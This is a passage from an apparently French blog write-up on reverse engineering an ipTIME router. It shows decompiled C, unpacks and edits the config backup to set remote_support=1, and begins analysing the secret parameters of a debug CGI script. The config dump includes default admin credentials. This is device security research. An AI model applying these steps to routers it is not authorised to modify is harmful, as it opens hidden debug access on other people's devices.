&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">get_remote_support&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">iconfig_get_intvalue_direct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;remote_support&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">iconfig_get_intvalue_direct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">acStack_28&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">iconfig_get_value_direct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_28&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">atoi&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_28&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">undefined4&lt;/span> &lt;span class="nf">iconfig_get_value_direct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">undefined1&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined4&lt;/span> &lt;span class="n">uVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined4&lt;/span> &lt;span class="n">local_20&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined4&lt;/span> &lt;span class="n">local_1c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">local_20&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">local_1c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">uVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">lock_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/etc/iconfig.cfg&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">genconfig_read_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/etc/iconfig.cfg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">genconfig_get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">genconfig_free_ll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">local_20&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">local_1c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">genconfig_read_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/etc/idefault.cfg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">genconfig_get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unlock_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uVar1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">genconfig_free_ll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unlock_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uVar1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">genconfig_free_ll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Il est possible de résumer tout cela par le fait que &lt;em>get_remote_support&lt;/em> vérifie que la valeur du paramètre &lt;em>remote_support&lt;/em> est différente de 0 dans le fichier de configuration du routeur &lt;em>/etc/ifconfig.cfg&lt;/em> en saidant des fonctions &lt;em>iconfig_get_intvalue_direct&lt;/em> et &lt;em>ifconfig_get_value_direct&lt;/em>. Dans le cas échéant, &lt;em>get_remote_support&lt;/em> renvoie 0 et une partie de la condition est satisfaite. Il faudra donc trouver un moyen de modifier cette valeur dans la configuration du routeur.&lt;/p>
&lt;p>Ne trouvant aucune mention de cette option dans le pannel d&amp;rsquo;administration, une des idées était de télécharger la configuration actuelle du routeur avec la fonctionnalité &lt;em>Config Backup&lt;/em>, modifier ou ajouter l&amp;rsquo;option &lt;em>remote_support&lt;/em> puis mettre à jour la configuration grâce à la fonctionnalité &lt;em>Config restore&lt;/em>.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/web-portal-backup.png" />&lt;figcaption style="text-align: center;">Téléchargement d'une copie de la configuration&lt;/figcaption>&lt;/figure>
&lt;p>Après le téléchargement de la sauvegarde du routeur, on peut voir qu&amp;rsquo;il s&amp;rsquo;agit d&amp;rsquo;une archive &lt;em>gzip&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file config.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config.cfg: gzip compressed data, last modified: Sat Jan &lt;span class="m">1&lt;/span> 00:00:02 2000, max compression, from Unix, original size modulo 2^32 &lt;span class="m">3384&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ 7z x config.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">7-Zip &lt;span class="o">[&lt;/span>64&lt;span class="o">]&lt;/span> 16.02 : Copyright &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> 1999-2016 Igor Pavlov : 2016-05-21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">p7zip Version 16.02 &lt;span class="o">(&lt;/span>&lt;span class="nv">locale&lt;/span>&lt;span class="o">=&lt;/span>en_US.UTF-8,Utf16&lt;span class="o">=&lt;/span>on,HugeFiles&lt;span class="o">=&lt;/span>on,64 bits,8 CPUs 11th Gen Intel&lt;span class="o">(&lt;/span>R&lt;span class="o">)&lt;/span> Core&lt;span class="o">(&lt;/span>TM&lt;span class="o">)&lt;/span> i7-1165G7 @ 2.80GHz &lt;span class="o">(&lt;/span>806C1&lt;span class="o">)&lt;/span>,ASM,AES-NI&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Scanning the drive &lt;span class="k">for&lt;/span> archives:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> file, &lt;span class="m">3379&lt;/span> bytes &lt;span class="o">(&lt;/span>&lt;span class="m">4&lt;/span> KiB&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Extracting archive: config.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Path&lt;/span> &lt;span class="o">=&lt;/span> config.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Type&lt;/span> &lt;span class="o">=&lt;/span> gzip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Headers &lt;span class="nv">Size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Everything is Ok
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Size: &lt;span class="m">3384&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compressed: &lt;span class="m">3379&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Néanmoins, une fois le fichier initial décompressé, nous nous retrouvons avec un format de fichier inconnu et &lt;em>n-ième&lt;/em> analyse nous est donc imposée.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file config
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config: data
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ xxd -l &lt;span class="m">20&lt;/span> config
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">00000000: &lt;span class="m">7261&lt;/span> 775f 6e76 &lt;span class="m">0000&lt;/span> &lt;span class="m">0000&lt;/span> &lt;span class="m">0000&lt;/span> &lt;span class="m">0000&lt;/span> &lt;span class="m">0000&lt;/span> raw_nv..........
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">00000010: 080d &lt;span class="m">0000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Après une recherche ciblée sur la signature &lt;em>raw_nv&lt;/em>, il a été possible d&amp;rsquo;identifier une &lt;a
class="gblog-markdown__link"
href="https://depier.re/old/understanding_iptime_configuration_backup_file_format.html"
>ressource&lt;/a> donnant des détails sur le mode de fonctionnement de ce format &lt;em>(qui après vérification concorde bien avec notre cas)&lt;/em> et offrant même un &lt;a
class="gblog-markdown__link"
href="https://github.com/DePierre/iptime_utils/tree/master"
>script&lt;/a> permettant de lire et modifier ce type de fichier de configuration.&lt;/p>
&lt;p>Nous allons donc :&lt;/p>
&lt;ol>
&lt;li>Extraire le contenu du fichier de configuration &lt;em>(config.cfg)&lt;/em>&lt;/li>
&lt;li>Ajouter la ligne &lt;em>remote_support=1&lt;/em> au fichier &lt;em>/etc/iconfig.cfg&lt;/em>&lt;/li>
&lt;li>Reconstruire le fichier de configuration &lt;em>(qui au passage doit suivre un format bien précis incluant un checksum)&lt;/em>&lt;/li>
&lt;li>Mettre à jour le routeur avec la nouvelle configuration&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 ipTIME_config.py -e config.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PoC &lt;span class="k">for&lt;/span> extracting/repacking ipTIME backup configuration file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: only tested on ipTIME n704 v3, firmware version 9.98.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Extracting ipTIME configuration...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extracting outer gzip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Dumping extracted header
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Magic: b&lt;span class="s1">&amp;#39;raw_nv&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Size of gz &lt;span class="o">(&lt;/span>compressed&lt;span class="o">)&lt;/span>: &lt;span class="m">3336&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Sum of gz bytes: 0x6A18B
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Max size: &lt;span class="m">32720&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FS id: 0x10000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extracting inner tar.gz tarball
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Extraction successful. You can now edit configuration files in ./etc/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use -c to pack the new configuration
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ &lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;remote_support=1&amp;#39;&lt;/span> &amp;gt;&amp;gt; etc/iconfig.cfg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ cat etc/iconfig.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wantype.wan1&lt;span class="o">=&lt;/span>dynamic
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dhblock.vlan1&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ppp_mtu&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1454&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">fakedns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">upnp&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ppp_mtu&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1454&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">timeserver&lt;/span>&lt;span class="o">=&lt;/span>time.windows.com,gmt22,1,480,0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">wan_ifname&lt;/span>&lt;span class="o">=&lt;/span>vlan1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">auto_dns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcp_auto_detect&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wireless_ifmode+eth1&lt;span class="o">=&lt;/span>eth1,0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lan_ip&lt;/span>&lt;span class="o">=&lt;/span>192.168.1.33
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lan_netmask&lt;/span>&lt;span class="o">=&lt;/span>255.255.255.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_conf&lt;/span>&lt;span class="o">=&lt;/span>br0,192.168.1.1,192.168.1.254,192.168.1.33,255.255.255.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_dns&lt;/span>&lt;span class="o">=&lt;/span>168.126.63.1,168.126.63.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_opt&lt;/span>&lt;span class="o">=&lt;/span>7200,30,200,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_configfile&lt;/span>&lt;span class="o">=&lt;/span>/etc/udhcpd.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_lease_file&lt;/span>&lt;span class="o">=&lt;/span>/etc/udhcpd.leases
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">dhcpd_static_lease_file&lt;/span>&lt;span class="o">=&lt;/span>/etc/udhcpd.static
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">login&lt;/span>&lt;span class="o">=&lt;/span>admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">password&lt;/span>&lt;span class="o">=&lt;/span>admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">org_hwaddr.vlan2&lt;span class="o">=&lt;/span>B8:55:10:C9:A4:E5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">nat_passthrough&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">use_local_gateway&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">remote_support&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 ipTIME_config.py -c new.cfg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PoC &lt;span class="k">for&lt;/span> extracting/repacking ipTIME backup configuration file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: only tested on ipTIME n704 v3, firmware version 9.98.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Packing new configuration files...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Create tarball of ./etc/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Generating new ipTIME header
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Computed sum: 0x7934C
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Creating outer gzip file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Packing successful. You can now upload the configuration file to ipTIME router.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h3 id="un--minerai-secret-en-paramètre"
>
Un &amp;quot; &lt;del>minerai&lt;/del>&amp;quot; secret en paramètre
&lt;/h3>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#un--minerai-secret-en-paramètre" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Un &amp;quot; minerai&amp;quot; secret en paramètre" href="#un--minerai-secret-en-param%c3%a8tre">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>La deuxième catégorie de condition semble plutôt claire. Si on reprend la condition au début de la fonction &lt;em>show_debug_screen&lt;/em>, on peut voir que le script &lt;strong>/cgi-bin/d.cgi&lt;/strong> attend quelques paramètres &amp;ldquo;secrets&amp;rdquo; :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">show_debug_screen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// DAT_00477bb4 = 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// DAT_00477bb0 = &amp;#34;act&amp;#34;
